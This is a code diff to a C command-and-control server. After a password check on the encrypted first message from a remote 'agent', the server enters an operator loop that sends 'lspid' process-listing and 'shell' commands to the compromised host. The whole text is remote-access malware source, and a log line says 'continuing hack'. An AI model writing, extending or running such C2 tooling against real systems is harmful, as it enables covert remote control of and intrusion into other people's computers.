@@ -6,6 +6,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <string.h>
+#include <fcntl.h>
 #include "c2_modules.h"
 
 #define BUFFER_SIZE 2048
@@ -58,33 +59,66 @@ int main(void){
 	}
 	printf("[+] listening on port %d...\n",PORT_NO);
 
+	int client_socket = 0;
 	while (1){
 	//accepting connections
-		int client_socket=accept(server_socket, NULL, NULL);
+		client_socket=accept(server_socket, NULL, NULL);
 		if (client_socket == -1){
 			perror("[x] accept() failed\n[x]exiting...\n");
 			exit(EXIT_FAILURE);
 		}
 		printf("[+] connection received...\n");
-			
 		//recv msg from agent
 		// should recv basic sysinfo with password to complete auth
 		char recv_buf[BUFFER_SIZE] = {0};
-		ssize_t bytes_recieved = recv(client_socket,recv_buf,BUFFER_SIZE-1,0);
-		if (bytes_recieved < 0){perror("[x] recv() failed\n");exit(EXIT_FAILURE);}
+		ssize_t bytes_received = recv(client_socket,recv_buf,BUFFER_SIZE-1,0);
+		if (bytes_received < 0){perror("[x] recv() failed\n");exit(EXIT_FAILURE);}
 
 		//printf("[+] agent says: %s\n",recv_buf);	//debug
 		
 
-
+		decrypt((unsigned char *)recv_buf,(size_t) bytes_received);
 		if ( AuthClient(recv_buf) != 0 ){
 			// maybe you can close that unauthenticated connection and keep listening
 			close(client_socket);
 		}
 		else {break;}
+		
 	}
+	printf("[+] goin to second loop\n");
+	ssize_t sent_bytes = 0;
+	ssize_t bytes_received = 0;
+	char cmd[BUFFER_SIZE] = {0};
+	
+	while (1){
+		//recv msg from agent
+		// should recv basic sysinfo with password to complete auth
+		
+		printf("HeartBeat> ");
+		fgets(cmd,BUFFER_SIZE,stdin);
+		cmd[strcspn(cmd, "\n")] = '\0';
 
-	printf("[+] Broken out of while loop and continuing hack\n");
+		if ( strcmp(cmd,"lspid") == 0){
+			printf("going to Hande func\n");
+			HandleLspid(cmd,client_socket);
+			continue;
+		}
+		else if ( strcmp(cmd,"shell") == 0){
+			printf("going to Hande func\n");
+			HandleShell(cmd,client_socket);
+			continue;
+		}
+
+		else if ( strcmp(cmd,"exit") == 0){
+			printf("This should exit\n");
+			continue;
+			
+		}
+		else{
+			continue;
+		}
+
+	}
 
 
 
